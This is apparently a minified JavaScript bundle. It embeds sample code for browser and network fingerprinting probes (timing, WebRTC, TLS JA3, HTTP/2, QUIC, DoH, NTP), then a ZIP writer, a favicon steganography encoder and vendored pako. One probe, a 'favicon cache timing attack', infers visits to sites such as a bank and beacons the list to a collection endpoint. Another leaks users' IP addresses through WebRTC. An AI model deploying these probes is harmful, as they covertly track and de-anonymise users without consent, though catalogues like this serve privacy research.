function onMove(e: PointerEvent) {
  if (!running) return;
  pts.push(e.clientX, e.clientY, e.pressure || 0, e.tiltX || 0, e.tiltY || 0);
}

function analyze(pts: number[]) {
  // Velocity histogram (5 buckets) → 5 bits
  const vels: number[] = [];
  for (let i = 2; i < pts.length; i += 5) {
    const dx = pts[i] - pts[i-5];
    const dy = pts[i+1] - pts[i-4];
    vels.push(Math.sqrt(dx*dx + dy*dy));
  }
  vels.sort((a,b)=>a-b);
  const buckets = [0,0,0,0,0];
  for (const v of vels) buckets[Math.min(4, Math.floor(v/15))]++;
  let h = 0;
  buckets.forEach((b,i) => h |= (b & 3) << (i*2));
  return { hash: (h>>>0).toString(16), samples: pts.length / 5 };
}`,"tm-probe":`// probe.js — high-resolution timer fingerprint
// performance.now() resolution varies by browser; some browsers quantize
export function probe() {
  const N = 1000;
  const t0 = performance.now();
  for (let i = 0; i < N; i++) performance.now();
  const t1 = performance.now();
  // t1-t0 should be near zero; the actual resolution is what we read
  return {
    elapsed_us: ((t1 - t0) * 1000 / N).toFixed(3),
    now: performance.now(),
    dateNow: Date.now(),
    timeOrigin: performance.timeOrigin,
  };
}`,"st-probe":`// probe.js — storage quota estimation
export async function probe() {
  if (!navigator.storage?.estimate) return { supported: false };
  const est = await navigator.storage.estimate();
  return {
    supported: true,
    quota: est.quota,
    usage: est.usage,
    usageRatio: est.usage && est.quota ? est.usage / est.quota : null,
  };
}`,"ja-conf":`# nginx_ja3.conf — JA3 fingerprint logging via nginx + lua
load_module modules/ngx_http_js_module.so;

env JA3_LOG_PATH;

http {
  js_import ja3.js;

  log_format ja3 '$remote_addr - $remote_user [$time_local] '
                  '"$request" $status $body_bytes_sent '
                  'ja3="$ja3_hash" ja4="$ja4_hash"';

  server {
    listen 443 ssl;
    ssl_protocols TLSv1.2 TLSv1.3;

    # Compute JA3 in access log
    access_log /var/log/nginx/ja3.log ja3;

    # Lua hook on TLS handshake
    ssl_certificate     /etc/ssl/cert.pem;
    ssl_certificate_key /etc/ssl/key.pem;

    location / {
      proxy_pass http://backend;
    }
  }
}`,"ja-py":`# parse_ja3.py — parse nginx JA3 log into structured records
import re, json, sys

LINE = re.compile(
  r'(?P<ip>\\S+).*"\\S+ (?P<path>\\S+).*ja3="(?P<ja3>[^"]*)" ja4="(?P<ja4>[^"]*)"'
)

def parse(log: str) -> list[dict]:
  out = []
  for line in log.splitlines():
    m = LINE.match(line)
    if m:
      out.append({
        'ip': m['ip'], 'path': m['path'],
        'ja3': m['ja3'], 'ja4': m['ja4'],
      })
  return out

if __name__ == '__main__':
  print(json.dumps(parse(sys.stdin.read()), indent=2))`,"h2-cap":`# h2_cap.py — capture HTTP/2 SETTINGS frame
# Uses h2 library to inspect raw h2 frames
import socket, ssl, struct

def capture(host: str, port: int = 443) -> dict:
  ctx = ssl.create_default_context()
  ctx.set_alpn_protocols(['h2'])
  sock = socket.create_connection((host, port))
  ssock = ctx.wrap_socket(sock, server_hostname=host)
  # Send client preface
  ssock.send(b'PRI * HTTP/2.0\\r\\n\\r\\nSM\\r\\n\\r\\n')
  # Send empty SETTINGS
  ssock.send(struct.pack('>I', 0)[1:] + b'\\x04\\x00\\x00\\x00\\x00\\x00\\x00')
  # Read server SETTINGS
  frame = ssock.recv(9)
  length = int.from_bytes(frame[:3], 'big')
  ftype = frame[3]
  body = ssock.recv(length)
  settings = {}
  for i in range(0, len(body), 6):
    k = int.from_bytes(body[i:i+2], 'big')
    v = int.from_bytes(body[i+2:i+6], 'big')
    settings[k] = v
  return { 'settings': settings }`,"h2-parse":`# parse.py — derive fingerprint from h2 settings
def fingerprint(settings: dict) -> str:
  # Akamai's h2 fingerprint: ordered list of (setting_id, value)
  parts = [f'{k}-{v}' for k, v in sorted(settings.items())]
  return ','.join(parts)`,"ft-probe2":`// timing_probe.js — favicon cache timing attack
// BSCA Observe: T (timing) | Phase: 1 | Persist: NONE
// Determines whether a favicon URL is cached (and thus visited)

const PROBE_URLS = [
  'https://target.example.com/favicon.ico',
  'https://bank.example.com/favicon.ico',
  // add more targets
];

async function probeCache(url) {
  const img   = new Image();
  const start = performance.now();

  return new Promise(resolve => {
    img.onload = img.onerror = () => {
      const delta = performance.now() - start;
      // Cached: delta < ~5ms. Uncached: delta > 30ms (network round-trip)
      resolve({ url, delta: delta.toFixed(2), cached: delta < 12 });
    };
    img.src = url + '?_=' + Math.random();
  });
}

export async function runProbes() {
  const results = await Promise.all(PROBE_URLS.map(probeCache));
  const visited = results.filter(r => r.cached).map(r => r.url);
  await navigator.sendBeacon('/fp/collect', JSON.stringify({
    ts: Date.now(), type: 'favicon-timing', visited, raw: results,
  }));
  return { visited, results };
}`,"ft-html":`<!DOCTYPE html>
<html><head><meta charset="UTF-8">
<title>cache probe</title></head>
<body>
  <script type="module">
    import { runProbes } from './timing_probe.js';
    const r = await runProbes();
    document.body.innerText = 'visited: ' + r.visited.length;
  <\/script>
</body></html>`,"wr-probe":`// probe.js — WebRTC IP leak
// BSCA Type: P | Phase: 1 | Persist: SESSION
export async function probe() {
  const pc = new RTCPeerConnection({
    iceServers: [{ urls: 'stun:stun.l.google.com:19302' }],
  });
  pc.createDataChannel('leak');

  const ips: string[] = [];
  pc.onicecandidate = e => {
    if (!e.candidate) return;
    const m = e.candidate.candidate.match(/([0-9a-f.:]+)\\s+typ/s);
    if (m && !ips.includes(m[1])) ips.push(m[1]);
  };

  pc.createOffer().then(o => pc.setLocalDescription(o));

  // Wait for ICE gathering to complete
  await new Promise(r => pc.onicegatheringstatechange = () => {
    if (pc.iceGatheringState === 'complete') r(null);
  });
  pc.close();
  return { ips, publicIps: ips.filter(ip => !ip.startsWith('192.') && !ip.startsWith('10.') && !ip.startsWith('172.') && !ip.startsWith('fd')) };
}`,"wr-stun":`// stun.js — minimal STUN client
// Used by WebRTC probe to discover public IP
export async function stun(server = 'stun.l.google.com:19302') {
  const pc = new RTCPeerConnection({ iceServers: [{ urls: 'stun:' + server }] });
  pc.createDataChannel('s');
  pc.createOffer().then(o => pc.setLocalDescription(o));
  return new Promise<string[]>(resolve => {
    const ips: string[] = [];
    pc.onicecandidate = e => {
      if (!e.candidate) { pc.close(); resolve(ips); return; }
      const m = /([0-9a-f.:]+)\\s+typ srflx/.exec(e.candidate.candidate);
      if (m) ips.push(m[1]);
    };
  });
}`,"qu-probe":`// probe.js — QUIC / HTTP/3 fingerprint
// Connect to an h3 endpoint, observe transport parameters
export async function probe(url: string) {
  // Use the WebTransport API where available
  if ('WebTransport' in window) {
    const t = new WebTransport(url);
    try {
      await t.ready;
      return { supported: true, ready: true };
    } catch (e) {
      return { supported: true, error: String(e) };
    }
  }
  return { supported: false };
}`,"qu-srv":`# server.py — aioquic-based QUIC server for fingerprinting
from aioquic.asyncio import serve
from aioquic.quic.configuration import QuicConfiguration

async def main():
  config = QuicConfiguration(is_server=True)
  config.load_cert_chain('cert.pem', 'key.pem')

  async def handler(reader, writer):
    # Inspect writer._protocol._quic.get_transport_parameters()
    print(writer._protocol._quic.get_transport_parameters())
    await reader.recv()

  await serve('0.0.0.0', 443, configuration=config, create_protocol=handler)
  await asyncio.Future()

import asyncio
asyncio.run(main())`,"doh-probe":`// probe.js — DNS-over-HTTPS resolver detection
// Different DoH providers have unique response times + cache behavior
const DOH_SERVERS = {
  cloudflare: 'https://cloudflare-dns.com/dns-query',
  google:     'https://dns.google/dns-query',
  quad9:      'https://dns.quad9.net/dns-query',
  adguard:    'https://dns.adguard.com/dns-query',
};

export async function probe(domain = 'example.com') {
  const results: Record<string, number> = {};
  for (const [name, url] of Object.entries(DOH_SERVERS)) {
    const t0 = performance.now();
    try {
      await fetch(url + '?name=' + domain + '&type=A', {
        headers: { 'accept': 'application/dns-json' },
      });
      results[name] = performance.now() - t0;
    } catch {
      results[name] = -1;
    }
  }
  return results;
}`,"doh-srv":`// server.js — log DoH probe hits (server-side)
const http = require('http');
http.createServer((req, res) => {
  console.log('[doh]', req.socket.remoteAddress, req.url);
  // Echo back a minimal valid DoH JSON response
  res.setHeader('content-type', 'application/dns-json');
  res.writeHead(200);
  res.end(JSON.stringify({
    Status: 0, TC: false, RD: true, RA: true,
    Answer: [{ name: 'example.com', type: 1, TTL: 300, data: '1.2.3.4' }],
  }));
}).listen(3037);`,"h3-probe":`// probe.js — HTTP/3 client fingerprint via WebTransport
export async function probe(url: string) {
  if (!('WebTransport' in window)) return { supported: false };
  const t = new WebTransport(url);
  try {
    const start = performance.now();
    await t.ready;
    const ready_ms = performance.now() - start;
    return { supported: true, ready_ms };
  } catch (e) { return { supported: true, err: String(e) }; }
}`,"h3-parse":`# parse.py — derive fingerprint from h3 transport parameters
# Captured at the server via aioquic
def fingerprint(tp: dict) -> str:
  keys = ['original_destination_connection_id',
          'max_idle_timeout', 'stateless_reset_token',
          'max_udp_payload_size', 'initial_max_data',
          'initial_max_stream_data_bidi_local',
          'initial_max_stream_data_bidi_remote',
          'initial_max_stream_data_uni',
          'initial_max_streams_bidi', 'initial_max_streams_uni',
          'ack_delay_exponent', 'max_ack_delay',
          'disable_active_migration', 'active_connection_id_limit']
  return ','.join(f'{k}={tp.get(k,"-")}' for k in keys)`,"ntp-net-probe":`# probe.py — NTPv4 packet, measure clock skew
import socket, struct, time

def probe(server='pool.ntp.org', port=123):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.settimeout(5)
  # NTPv4 client packet
  pkt = bytearray(48)
  pkt[0] = 0x1B  # li=0, vn=3, mode=3 (client)
  t0 = time.time()
  s.sendto(bytes(pkt), (server, port))
  data, _ = s.recvfrom(1024)
  t1 = time.time()
  # Server-side transmit timestamp is at offset 40
  secs = struct.unpack('!I', data[40:44])[0] - 2208988800
  frac = struct.unpack('!I', data[44:48])[0] / 2**32
  server_time = secs + frac
  rtt = t1 - t0
  skew = server_time - (t0 + rtt/2)
  return { server_time, rtt, skew }`,"ntp-net-srv":`# server.py — minimal NTP server for clock-skew detection
# Uses ntplib's server mode
import socket, struct, time

def serve(port=123):
  s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
  s.bind(('0.0.0.0', port))
  while True:
    data, addr = s.recvfrom(1024)
    t = time.time()
    secs = int(t) + 2208988800
    frac = int((t - int(t)) * 2**32)
    reply = bytearray(48)
    reply[0] = 0x24  # li=0, vn=4, mode=4 (server)
    struct.pack_into('!IIIIIIII', reply, 40, secs, frac, secs, frac, secs, frac)
    s.sendto(bytes(reply), addr)`};function s1(l){let c=-1;for(let r=0;r<l.length;r++){c^=l[r];for(let o=0;o<8;o++)c=c&1?c>>>1^3988292384:c>>>1}return~c>>>0}function of(l){let c="";for(let r=0;r<l.length;r+=32768)c+=String.fromCharCode(...l.subarray(r,r+32768));return btoa(c)}const fm=23073,dm=24576;function og(l){const c=new TextEncoder,r=[],o=[];let d=0;for(const v of l){const b=c.encode(v.path),w=s1(v.data),T=new DataView(new ArrayBuffer(30));T.setUint32(0,67324752,!0),T.setUint16(4,20,!0),T.setUint16(6,2048,!0),T.setUint16(8,0,!0),T.setUint16(10,dm,!0),T.setUint16(12,fm,!0),T.setUint32(14,w,!0),T.setUint32(18,v.data.length,!0),T.setUint32(22,v.data.length,!0),T.setUint16(26,b.length,!0),T.setUint16(28,0,!0),r.push(new Uint8Array(T.buffer),b,v.data);const U=new DataView(new ArrayBuffer(46));U.setUint32(0,33639248,!0),U.setUint16(4,20,!0),U.setUint16(6,20,!0),U.setUint16(8,2048,!0),U.setUint16(10,0,!0),U.setUint16(12,dm,!0),U.setUint16(14,fm,!0),U.setUint32(16,w,!0),U.setUint32(20,v.data.length,!0),U.setUint32(24,v.data.length,!0),U.setUint16(28,b.length,!0),U.setUint32(42,d,!0),o.push(new Uint8Array(U.buffer),b),d+=30+b.length+v.data.length}const f=o.reduce((v,b)=>v+b.length,0),g=new DataView(new ArrayBuffer(22));g.setUint32(0,101010256,!0),g.setUint16(8,l.length,!0),g.setUint16(10,l.length,!0),g.setUint32(12,f,!0),g.setUint32(16,d,!0);const y=d+f+22,_=new Uint8Array(y);let m=0;for(const v of[...r,...o,new Uint8Array(g.buffer)])_.set(v,m),m+=v.length;return _}function c1(l){const c=l.length,r=6+c*16,o=l.map(_=>40+_.bgrx.length+_.andMask.length);let d=r;const f=o.map(_=>(d+=_)-_),g=new Uint8Array(d),y=new DataView(g.buffer);return y.setUint16(0,0,!0),y.setUint16(2,1,!0),y.setUint16(4,c,!0),l.forEach((_,m)=>{const v=6+m*16;g[v]=_.w>=256?0:_.w,g[v+1]=_.h>=256?0:_.h,g[v+2]=0,g[v+3]=0,y.setUint16(v+4,1,!0),y.setUint16(v+6,32,!0),y.setUint32(v+8,o[m],!0),y.setUint32(v+12,f[m],!0);let b=f[m];y.setUint32(b,40,!0),y.setInt32(b+4,_.w,!0),y.setInt32(b+8,_.h*2,!0),y.setUint16(b+12,1,!0),y.setUint16(b+14,32,!0),y.setUint32(b+20,0,!0),y.setUint32(b+24,_.bgrx.length+_.andMask.length,!0),b+=40,g.set(_.bgrx,b),b+=_.bgrx.length,g.set(_.andMask,b)}),g}function Ws(l){if(l.length<6)throw new Error("not an ico");const c=new DataView(l.buffer,l.byteOffset,l.byteLength);if(c.getUint16(0,!0)!==0||c.getUint16(2,!0)!==1)throw new Error("not an ico");const r=c.getUint16(4,!0),o=[];for(let d=0;d<r;d++){const f=6+d*16,g=hm(l[f]),y=hm(l[f+1]),_=c.getUint16(f+6,!0);c.getUint32(f+8,!0);const m=c.getUint32(f+12,!0);if(_!==32)continue;const v=4,b=Math.ceil(g/32)*4,w=g*y*v,T=b*y,U=new Uint8Array(w),G=new Uint8Array(T),q=m+40;U.set(l.subarray(q,q+w)),G.set(l.subarray(q+w,q+w+T)),o.push({w:g,h:y,bgrx:U,andMask:G})}return o}function hm(l){return l===0?256:l}function o1(l){const c=[0,1,0,0,0,1,0,0,1,2,1,0,0,1,2,1,1,2,0,1,1,0,2,1,1,2,0,1,1,0,2,1,1,2,0,0,0,0,2,1,1,2,0,0,0,0,2,1,1,2,0,0,0,0,2,1,0,0,0,0,0,0,0,0],r={red:[40,54,217],cream:[216,230,233],ink:[23,21,16]},o=f=>{const g=new Uint8Array(f*f*4),y=new Uint8Array(Math.ceil(f/32)*4*f);for(let _=0;_<f;_++)for(let m=0;m<f;m++){const v=Math.floor(m/f*8),b=Math.floor(_/f*8),w=c[b*8+v],T=(_*f+m)*4,U=m===0||_===0||m===f-1||_===f-1;let G=w===0?0:255;U&&w!==0&&(G=128+(m*7+_*13)%96-48);const q=w===1?r.cream:w===2?r.ink:r.red;g[T]=q[2],g[T+1]=q[1],g[T+2]=q[0],g[T+3]=G,y[Math.floor((_*f+m)/8)]|=G===0?1<<7-(_*f+m)%8:0}return{w:f,h:f,bgrx:g,andMask:y}};return[16,32,48].map(o)}const xf=[77,70,52,55];function u1(l,c){const r=l.find(f=>f.w===48&&f.h===48)??l[l.length-1],o=new TextEncoder().encode(c),d=[];for(const f of[...xf,o.length>>8&255,o.length&255,...o])for(let g=7;g>=0;g--)d.push(f>>g&1);return f1(r,d),d.length}function ug(l){const c=[];for(let r=3;r<l.bgrx.length;r+=4)c.push(l.bgrx[r]&1);return c}function f1(l,c){let r=3;for(const o of c){if(r>=l.bgrx.length)break;l.bgrx[r]=l.bgrx[r]&254|o,r+=4}}function d1(l){const c=Ws(l),r=c.find(d=>d.w===48&&d.h===48)??c[c.length-1];if(!r)return null;const o=ug(r);return fg(o)}function fg(l){const c=xf.flatMap(g=>[...Array(8)].map((y,_)=>g>>7-_&1));let r=-1;e:for(let g=0;g+c.length+16<l.length;g++){for(let y=0;y<c.length;y++)if(l[g+y]!==c[y])continue e;r=g;break}if(r<0)return null;let o=0;for(let g=0;g<16;g++)o=o<<1|l[r+c.length+g];if(o>1024)return null;const d=[];for(let g=0;g<o&&r+c.length+16+g*8+8<=l.length;g++){let y=0;for(let _=0;_<8;_++)y=y<<1|l[r+c.length+16+g*8+_];d.push(y)}let f=d.length;for(;f>0&&(d[f-1]<32||d[f-1]>126);)f--;try{return new TextDecoder().decode(new Uint8Array(d.slice(0,f)))}catch{return null}}/*! pako 2.2.0 https://github.com/nodeca/pako @license (MIT AND Zlib) */const h1=4,pm=0,mm=1,p1=2;function Ql(l){let c=l.length;for(;--c>=0;)l[c]=0}const m1=0,dg=1,g1=2,v1=3,y1=258,Sf=29,lr=256,Pi=lr+1+Sf,Yl=30,Tf=19,hg=2*Pi+1,qn=15,Qu=16,b1=7,wf=256,pg=16,mg=17,gg=18,uf=new Uint8Array([0,0,0,0,0,0,0,0,1,1,1,1,2,2,2,2,3,3,3,3,4,4,4,4,5,5,5,5,0]),Qs=new Uint8Array([0,0,0,0,1,1,2,2,3,3,4,4,5,5,6,6,7,7,8,8,9,9,10,10,11,11,12,12,13,13]),_1=new Uint8Array([0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,0,2,3,7]),vg=new Uint8Array([16,17,18,0,8,7,9,6,10,5,11,4,12,3,13,2,14,1,15]),x1=512,Ha=new Array((Pi+2)*2);Ql(Ha);const Ii=new Array(Yl*2);Ql(Ii);const $i=new Array(x1);Ql($i);const Wi=new Array(y1-v1+1);Ql(Wi);const Ef=new Array(Sf);Ql(Ef);const Ks=new Array(Yl);Ql(Ks);function Ku(l,c,r,o,d){this.static_tree=l,this.extra_bits=c,this.extra_base=r,this.elems=o,this.max_length=d,this.has_stree=l&&l.length}let yg,bg,_g;function Iu(l,c){this.dyn_tree=l,this.max_code=0,this.stat_desc=c}const xg=l=>l<256?$i[l]:$i[256+(l>>>7)],er=(l,c)=>{l.pending_buf[l.pending++]=c&255,l.pending_buf[l.pending++]=c>>>8&255},St=(l,c,r)=>{l.bi_valid>Qu-r?(l.bi_buf|=c<<l.bi_valid&65535,er(l,l.bi_buf),l.bi_buf=c>>Qu-l.bi_valid,l.bi_valid+=r-Qu):(l.bi_buf|=c<<l.bi_valid&65535,l.bi_valid+=r)},ma=(l,c,r)=>{St(l,r[c*2],r[c*2+1])},Sg=(l,c)=>{let r=0;do r|=l&1,l>>>=1,r<<=1;while(--c>0);return r>>>1},S1=l=>{l.bi_valid===16?(er(l,l.bi_buf),l.bi_buf=0,l.bi_valid=0):l.bi_valid>=8&&(l.pending_buf[l.pending++]=l.bi_buf&255,l.bi_buf>>=8,l.bi_valid-=8)},T1=(l,c)=>{const r=c.dyn_tree,o=c.max_code,d=c.stat_desc.static_tree,f=c.stat_desc.has_stree,g=c.stat_desc.extra_bits,y=c.stat_desc.extra_base,_=c.stat_desc.max_length;let m,v,b,w,T,U,G=0;for(w=0;w<=qn;w++)l.bl_count[w]=0;for(r[l.heap[l.heap_max]*2+1]=0,m=l.heap_max+1;m<hg;m++)v=l.heap[m],w=r[r[v*2+1]*2+1]+1,w>_&&(w=_,G++),r[v*2+1]=w,!(v>o)&&(l.bl_count[w]++,T=0,v>=y&&(T=g[v-y]),U=r[v*2],l.opt_len+=U*(w+T),f&&(l.static_len+=U*(d[v*2+1]+T)));if(G!==0){do{for(w=_-1;l.bl_count[w]===0;)w--;l.bl_count[w]--,l.bl_count[w+1]+=2,l.bl_count[_]--,G-=2}while(G>0);for(w=_;w!==0;w--)for(v=l.bl_count[w];v!==0;)b=l.heap[--m],!(b>o)&&(r[b*2+1]!==w&&(l.opt_len+=(w-r[b*2+1])*r[b*2],r[b*2+1]=w),v--)}},Tg=(l,c,r)=>{const o=new Array(qn+1);let d=0,f,g;for(f=1;f<=qn;f++)d=d+r[f-1]<<1,o[f]=d;for(g=0;g<=c;g++){let y=l[g*2+1];y!==0&&(l[g*2]=Sg(o[y]++,y))}},w1=()=>{let l,c,r,o,d;const f=new Array(qn+1);for(r=0,o=0;o<Sf-1;o++)for(Ef[o]=r,l=0;l<1<<uf[o];l++)Wi[r++]=o;for(Wi[r-1]=o,d=0,o=0;o<16;o++)for(Ks[o]=d,l=0;l<1<<Qs[o];l++)$i[d++]=o;for(d>>=7;o<Yl;o++)for(Ks[o]=d<<7,l=0;l<1<<Qs[o]-7;l++)$i[256+d++]=o;for(c=0;c<=qn;c++)f[c]=0;for(l=0;l<=143;)Ha[l*2+1]=8,l++,f[8]++;for(;l<=255;)Ha[l*2+1]=9,l++,f[9]++;for(;l<=279;)Ha[l*2+1]=7,l++,f[7]++;for(;l<=287;)Ha[l*2+1]=8,l++,f[8]++;for(Tg(Ha,Pi+1,f),l=0;l<Yl;l++)Ii[l*2+1]=5,Ii[l*2]=Sg(l,5);yg=new Ku(Ha,uf,lr+1,Pi,qn),bg=new Ku(Ii,Qs,0,Yl,qn),_g=new Ku(new Array(0),_1,0,Tf,b1)},wg=l=>{let c;for(c=0;c<Pi;c++)l.dyn_ltree[c*2]=0;for(c=0;c<Yl;c++)l.dyn_dtree[c*2]=0;for(c=0;c<Tf;c++)l.bl_tree[c*2]=0;l.dyn_ltree[wf*2]=1,l.opt_len=l.static_len=0,l.sym_next=l.matches=0},Eg=l=>{l.bi_valid>8?er(l,l.bi_buf):l.bi_valid>0&&(l.pending_buf[l.pending++]=l.bi_buf),l.bi_buf=0,l.bi_valid=0},gm=(l,c,r,o)=>{const d=c*2,f=r*2;return l[d]<l[f]||l[d]===l[f]&&o[c]<=o[r]},Fu=(l,c,r)=>{const o=l.heap[r];let d=r<<1;for(;d<=l.heap_len&&(d<l.heap_len&&gm(c,l.heap[d+1],l.heap[d],l.depth)&&d++,!gm(c,o,l.heap[d],l.depth));)l.heap[r]=l.heap[d],r=d,d<<=1;l.heap[r]=o},vm=(l,c,r)=>{let o,d,f=0,g,y;if(l.sym_next!==0)do o=l.pending_buf[l.sym_buf+f++]&255,o+=(l.pending_buf[l.sym_buf+f++]&255)<<8,d=l.pending_buf[l.sym_buf+f++],o===0?ma(l,d,c):(g=Wi[d],ma(l,g+lr+1,c),y=uf[g],y!==0&&(d-=Ef[g],St(l,d,y)),o--,g=xg(o),ma(l,g,r),y=Qs[g],y!==0&&(o-=Ks[g],St(l,o,y)));while(f<l.sym_next);ma(l,wf,c)},ff=(l,c)=>{const r=c.dyn_tree,o=c.stat_desc.static_tree,d=c.stat_desc.has_stree,f=c.stat_desc.elems;let g,y,_=-1,m;for(l.heap_len=0,l.heap_max=hg,g=0;g<f;g++)r[g*2]!==0?(l.heap[++l.heap_len]=_=g,l.depth[g]=0):r[g*2+1]=0;for(;l.heap_len<2;)m=l.heap[++l.heap_len]=_<2?++_:0,r[m*2]=1,l.depth[m]=0,l.opt_len--,d&&(l.static_len-=o[m*2+1]);for(c.max_code=_,g=l.heap_len>>1;g>=1;g--)Fu(l,r,g);m=f;do g=l.heap[1],l.heap[1]=l.heap[l.heap_len--],Fu(l,r,1),y=l.heap[1],l.heap[--l.heap_max]=g,l.heap[--l.heap_max]=y,r[m*2]=r[g*2]+r[y*2],l.depth[m]=(l.depth[g]>=l.depth[y]?l.depth[g]:l.depth[y])+1,r[g*2+1]=r[y*2+1]=m,l.heap[1]=m++,Fu(l,r,1);while(l.heap_len>=2);l.heap[--l.heap_max]=l.heap[1],T1(l,c),Tg(r,_,l.bl_count)},ym=(l,c,r)=>{let o,d=-1,f,g=c[1],y=0,_=7,m=4;for(g===0&&(_=138,m=3),c[(r+1)*2+1]=65535,o=0;o<=r;o++)f=g,g=c[(o+1)*2+1],!(++y<_&&f===g)&&(y<m?l.bl_tree[f*2]+=y:f!==0?(f!==d&&l.bl_tree[f*2]++,l.bl_tree[pg*2]++):y<=10?l.bl_tree[mg*2]++:l.bl_tree[gg*2]++,y=0,d=f,g===0?(_=138,m=3):f===g?(_=6,m=3):(_=7,m=4))},bm=(l,c,r)=>{let o,d=-1,f,g=c[1],y=0,_=7,m=4;for(g===0&&(_=138,m=3),o=0;o<=r;o++)if(f=g,g=c[(o+1)*2+1],!(++y<_&&f===g)){if(y<m)do ma(l,f,l.bl_tree);while(--y!==0);else f!==0?(f!==d&&(ma(l,f,l.bl_tree),y--),ma(l,pg,l.bl_tree),St(l,y-3,2)):y<=10?(ma(l,mg,l.bl_tree),St(l,y-3,3)):(ma(l,gg,l.bl_tree),St(l,y-11,7));y=0,d=f,g===0?(_=138,m=3):f===g?(_=6,m=3):(_=7,m=4)}},E1=l=>{let c;for(ym(l,l.dyn_ltree,l.l_desc.max_code),ym(l,l.dyn_dtree,l.d_desc.max_code),ff(l,l.bl_desc),c=Tf-1;c>=3&&l.bl_tree[vg[c]*2+1]===0;c--);return l.opt_len+=3*(c+1)+5+5+4,c},A1=(l,c,r,o)=>{let d;for(St(l,c-257,5),St(l,r-1,5),St(l,o-4,4),d=0;d<o;d++)St(l,l.bl_tree[vg[d]*2+1],3);bm(l,l.dyn_ltree,c-1),bm(l,l.dyn_dtree,r-1)},j1=l=>{let c=4093624447,r;for(r=0;r<=31;r++,c>>>=1)if(c&1&&l.dyn_ltree[r*2]!==0)return pm;if(l.dyn_ltree[18]!==0||l.dyn_ltree[20]!==0||l.dyn_ltree[26]!==0)return mm;for(r=32;r<lr;r++)if(l.dyn_ltree[r*2]!==0)return mm;return pm};let _m=!1;const N1=l=>{_m||(w1(),_m=!0),l.l_desc=new Iu(l.dyn_ltree,yg),l.d_desc=new Iu(l.dyn_dtree,bg),l.bl_desc=new Iu(l.bl_tree,_g),l.bi_buf=0,l.bi_valid=0,wg(l)},Ag=(l,c,r,o)=>{St(l,(m1<<1)+(o?1:0),3),Eg(l),er(l,r),er(l,~r),r&&l.pending_buf.set(l.window.subarray(c,c+r),l.pending),l.pending+=r},C1=l=>{St(l,dg<<1,3),ma(l,wf,Ha),S1(l)},z1=(l,c,r,o)=>{let d,f,g=0;l.level>0?(l.strm.data_type===p1&&(l.strm.data_type=j1(l)),ff(l,l.l_desc),ff(l,l.d_desc),g=E1(l),d=l.opt_len+3+7>>>3,f=l.static_len+3+7>>>3,f<=d&&(d=f)):d=f=r+5,r+4<=d&&c!==-1?Ag(l,c,r,o):l.strategy===h1||f===d?(St(l,(dg<<1)+(o?1:0),3),vm(l,Ha,Ii)):(St(l,(g1<<1)+(o?1:0),3),A1(l,l.l_desc.max_code+1,l.d_desc.max_code+1,g+1),vm(l,l.dyn_ltree,l.dyn_dtree)),wg(l),o&&Eg(l)},O1=(l,c,r)=>(l.pending_buf[l.sym_buf+l.sym_next++]=c,l.pending_buf[l.sym_buf+l.sym_next++]=c>>8,l.pending_buf[l.sym_buf+l.sym_next++]=r,c===0?l.dyn_ltree[r*2]++:(l.matches++,c--,l.dyn_ltree[(Wi[r]+lr+1)*2]++,l.dyn_dtree[xg(c)*2]++),l.sym_next===l.sym_end);var R1=N1,D1=Ag,U1=z1,M1=O1,H1=C1,B1={_tr_init:R1,_tr_stored_block:D1,_tr_flush_block:U1,_tr_tally:M1,_tr_align:H1};const k1=(l,c,r,o)=>{let d=l&65535|0,f=l>>>16&65535|0,g=0;for(;r!==0;){g=r>2e3?2e3:r,r-=g;do d=d+c[o++]|0,f=f+d|0;while(--g);d%=65521,f%=65521}return d|f<<16|0};var tr=k1;const L1=()=>{let l,c=[];for(var r=0;r<256;r++){l=r;for(var o=0;o<8;o++)l=l&1?3988292384^l>>>1:l>>>1;c[r]=l}return c},G1=new Uint32Array(L1()),q1=(l,c,r,o)=>{const d=G1,f=o+r;l^=-1;for(let g=o;g<f;g++)l=l>>>8^d[(l^c[g])&255];return l^-1};var et=q1,Xn={2:"need dictionary",1:"stream end",0:"","-1":"file error","-2":"stream error","-3":"data error","-4":"insufficient memory","-5":"buffer error","-6":"incompatible version"},ir={Z_NO_FLUSH:0,Z_PARTIAL_FLUSH:1,Z_SYNC_FLUSH:2,Z_FULL_FLUSH:3,Z_FINISH:4,Z_BLOCK:5,Z_TREES:6,Z_OK:0,Z_STREAM_END:1,Z_NEED_DICT:2,Z_ERRNO:-1,Z_STREAM_ERROR:-2,Z_DATA_ERROR:-3,Z_MEM_ERROR:-4,Z_BUF_ERROR:-5,Z_NO_COMPRESSION:0,Z_BEST_SPEED:1,Z_BEST_COMPRESSION:9,Z_DEFAULT_COMPRESSION:-1,Z_FILTERED:1,Z_HUFFMAN_ONLY:2,Z_RLE:3,Z_FIXED:4,Z_DEFAULT_STRATEGY:0,Z_BINARY:0,Z_TEXT:1,Z_UNKNOWN:2,Z_DEFLATED:8};const{_tr_init:Y1,_tr_stored_block:df,_tr_flush_block:Z1,_tr_tally:mn,_tr_align:X1}=B1,{Z_NO_FLUSH:gn,Z_PARTIAL_FLUSH:V1,Z_FULL_FLUSH:Q1,Z_FINISH:Vt,Z_BLOCK:xm,Z_OK:ot,Z_STREAM_END:Sm,Z_STREAM_ERROR:ga,Z_DATA_ERROR:K1,Z_BUF_ERROR:Ju,Z_DEFAULT_COMPRESSION:I1,Z_FILTERED:F1,Z_HUFFMAN_ONLY:Gs,Z_RLE:J1,Z_FIXED:P1,Z_DEFAULT_STRATEGY:$1,Z_UNKNOWN:W1,Z_DEFLATED:ec}=ir,e_=9,t_=15,a_=8,n_=29,l_=256,hf=l_+1+n_,i_=30,r_=19,s_=2*hf+1,c_=15,Te=3,pn=258,va=pn+Te+1,o_=32,Xl=42,Af=57,pf=69,mf=73,gf=91,vf=103,Yn=113,Qi=666,mt=1,Kl=2,Vn=3,Il=4,u_=3,Zn=(l,c)=>(l.msg=Xn[c],c),Tm=l=>l*2-(l>4?9:0),hn=l=>{let c=l.length;for(;--c>=0;)l[c]=0},f_=l=>{let c,r,o,d=l.w_size;c=l.hash_size,o=c;do r=l.head[--o],l.head[o]=r>=d?r-d:0;while(--c);c=d,o=c;do r=l.prev[--o],l.prev[o]=r>=d?r-d:0;while(--c)};let jf=(l,c,r)=>(c<<l.hash_shift^r)&l.hash_mask;const Qn=(l,c)=>{let r;if(l.legacy_hash)r=l.ins_h=jf(l,l.ins_h,l.window[c+Te-1]);else{const 